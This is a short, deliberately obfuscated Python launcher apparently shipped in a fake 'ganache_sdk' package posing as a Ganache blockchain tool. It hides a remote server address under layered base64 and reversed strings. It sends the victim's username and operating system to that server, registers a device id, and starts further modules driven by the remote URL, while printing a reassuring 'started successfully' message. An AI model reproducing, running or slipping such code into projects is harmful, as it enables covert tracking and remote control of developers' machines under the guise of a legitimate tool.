C=print
B=open
import os,platform as E
from ganache_sdk.helperwd import AB,AA
import requests as F,getpass as G,json,base64 as D
from ganache_sdk.fflg import AM
from ganache_sdk.utils import K
H='==QZtFmb'
I='==QblR3c5N3Xn5Wa0FmclB3b'
J='vMXZjlmdlR2L'
M='lNmc192c'
N='==AduVWbudWazNXY'
def A():
	A='WVVoU01HTklUVFpNZVRsdVdWYzFhRmt5YUd4TWJYaHdaRzFWZGxsWVFuQk1NMWw0'
	for C in range(3):B=D.b64decode(A);A=B.decode('utf-8')
	return A
def L():
	C='file.txt'
	if os.path.exists(C):
		with B(C,'r')as D:id=D.read();return id
	else:
		L={K(H):G.getuser(),K(I):E.system(),K(M):K(N)};M=F.post(A()+K(J),data=L);N=json.loads(M.content);id=N['id']
		with B(C,'w')as D:D.write(id);return id
def M():
	with B('ganache_sdk/done','w')as A:0
def N():B=L();C('Launching Ganache');D=AB(B,A());D.run();E=AA(B,A());E.run();AM(base_url=A(),device_id=B);M();C('Ganache has been started successfully !!!')
N()